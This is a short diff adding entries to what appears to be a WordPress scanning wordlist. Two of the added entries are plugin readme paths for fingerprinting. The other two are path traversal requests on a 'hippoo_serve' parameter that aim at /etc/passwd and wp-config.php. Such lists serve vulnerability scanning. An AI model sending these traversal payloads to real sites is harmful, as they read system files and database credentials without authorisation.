@@ -890,3 +890,7 @@
 /wp-sitemap-posts-joomsport_season-1.xml
 /wp-content/plugins/woocommerce-delivery-notes/readme.txt
 /wp-content/plugins/armember-membership/readme.txt
+/wp-content/plugins/hippoo/readme.txt
+/wp-content/plugins/everest-forms-pro/readme.txt
+/?hippoo_serve=../../../../../../../etc/passwd
+/?hippoo_serve=../../../../wp-config.php
